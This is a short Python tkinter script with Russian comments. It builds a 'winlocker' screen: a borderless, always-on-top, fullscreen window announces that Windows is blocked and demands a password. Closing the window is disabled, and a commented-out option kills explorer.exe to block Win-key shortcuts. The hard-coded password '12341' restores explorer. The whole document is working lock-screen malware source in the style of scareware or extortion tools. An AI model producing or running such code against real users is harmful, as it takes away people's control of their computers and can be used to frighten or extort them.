from tkinter import *
from subprocess import Popen as cmd
import sys

NameFile = sys.argv[0]

root = Tk()


def CheckPassword(arg):
    if password.get() == "12341":
        root.destroy()
        cmd("start explorer.exe", shell=True)
        # Универсальный вариант!
        try:
            quit()
        except:
            cmd(f"taskkill /f /in {NameFile}", shell=True)
        #                                     #


X = root.winfo_screenwidth()
Y = root.winfo_screenheight()

# cmd("taskkill /f /in explorer.exe", shell=True) # Раскомментировать если хотите запретить доступ к комбинациям "Win+*"


bg = "black"
root["bg"] = bg
font = "Arial 25 bold"
root.protocol("WM_DELETE_WINDOW", lambda arg: ...)  # То же самое что Quit только упрощенно
root.attributes("-topmost", 1)
root.geometry(f"{X}x{Y}")
root.overrideredirect(1)
Label(text="Ваш Windows заблокирован!", fg="red", bg=bg, font=font).pack()
Label(text="\n\n\n\nВведите пароль", fg="white", bg=bg, font=font).pack()

password = Entry(font=font)
password.pack()
password.bind("<Return>", CheckPassword)
root.mainloop()
